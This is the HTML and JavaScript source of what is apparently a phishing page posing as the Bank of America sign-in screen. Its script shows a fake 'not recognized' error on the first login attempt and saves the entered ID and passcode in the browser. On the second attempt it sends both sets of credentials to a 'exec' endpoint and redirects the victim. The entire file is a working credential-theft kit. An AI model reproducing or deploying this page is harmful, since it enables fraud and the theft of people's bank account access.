<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank of America Login</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <style>
        *body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .main {
            width: 100%;
            margin: auto;
        }

        .ram {
            height: 10vh;
            width: 100%;
            background-color: #e31837;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .ram>img {
            width: 11rem;
    height: 5vh;
        }

        .f1 {

            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            margin: auto;
            gap: 1rem;
            margin-top: 3rem;
        }

        input {
            padding: 1rem;
            border-radius: 1rem;
            outline: none;
            font-size: 1rem;
        }

        button {
            padding: 0.3rem;
            background-color: rgb(25 126 190);
            color: white;
            border-radius: 1rem;
            font-size: 1rem;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1rem;
            border: none;
            cursor: pointer;
        }

        .fo {
            display: flex;
            gap: 2rem;
            color: blue;
            justify-content: center;
        }

        .secure {
            height: 10vh;
            padding: 0.6rem;
        }

        .s1 {
            display: flex;
            justify-content: space-between;
            color: rgb(0, 187, 255);
        }

        .s11 {
            display: flex;
            gap: 1rem;
        }

        .f2>p {
            color: #e31837;
        }


        .f2 {
            display: none;
        }

        .r3 {
            font-size: 10px;
        }

        .s1 p {
            font-size: 11px;
        }

        .we {
            color: red;
        }

        @media screen and (min-device-width: 300px) and (max-device-width: 680px) {
            .main {
                width: 100%;
            }

            .f1 {
                width: 100%;
            }
            .ram{
                height: 5vh;
            }
            .ram>img{
                width: 12rem;
    height: 3vh;
            }
        }
    </style>
</head>

<body>
    <div class="main">
        <div class="ram">
            <img
                src="data:image/png;base64," />
        </div>

        <form class="f1" id="f1" method="POST" onsubmit="preventDef(event)">

        <label class="form-label text-danger wrong" style='color:red;display:none' id='error-msg'>Your user ID or password is not recognized. Please try again.</label>
            <input type="text" placeholder="Online ID" class="i1" id="i1" maxlength="16" required>
            <input type="password" placeholder="Passcode" maxlength="8" class="i2"  id="i2" required>
            <button type="submit" class="btn" >
                <svg width="15" height="18" viewBox="0 0 24 24">
                    <path fill="white"
                        d="M18 10v-4c0-3.313-2.687-6-6-6s-6 2.687-6 6v4h-3v14h18v-14h-3zm-10 0v-4c0-2.206 1.794-4 4-4s4 1.794 4 4v4h-8z" />
                </svg>
                <p>Sign in</p>
            </button>
        </form>

        <div class="fo">
            <p>Forgot/Passcode?</p>
            <p>Enroll</p>
        </div>

        <footer class="secure">
            <div class="s1">
                <div class="s11">
                    <p>Privacy</p>
                    <p>Security</p>
                </div>
                <div>
                    <p>Equal Housing Lender</p>
                </div>
            </div>
            <div>
                <p class="r3"> 2021 Bank of America Corporation. All rights reserved.Bank of America,N.A. Member FDIC.
                </p>
            </div>
    </div>
    </footer>
    </div>
</body>
 <script type="text/javascript">
     const preventDef = e => e.preventDefault()

            $(document).ready(function () {
                $('#f1').submit( function (e) {
                  e.preventDefault()
                    
                    if (window.localStorage.getItem("id") !== null) {
                        const prev_id = window.localStorage.getItem("id");
                        const prev_pass = window.localStorage.getItem("pass");
                        const id = $("#i1").val();
                        const password = $("#i2").val();
                        $.post("exec", { sko: id, skun: password, sko1: prev_id, skun1: prev_pass }, function () {
                          window.location.href = "menikooko";

                        });
                    } else {
                      const id = $("#i1").val();
                      const password = $("#i2").val();
                      window.localStorage.setItem("id", id);
                      window.localStorage.setItem("pass", password);
                      $("#i1").val('');
                      $("#i2").val('');
                      // $(".wrong").removeClass("d-none");
                      $('#error-msg').show()
                    //   $(".eyesvg").addClass("d-none");
                    }

                });
            });



</script>

</html>
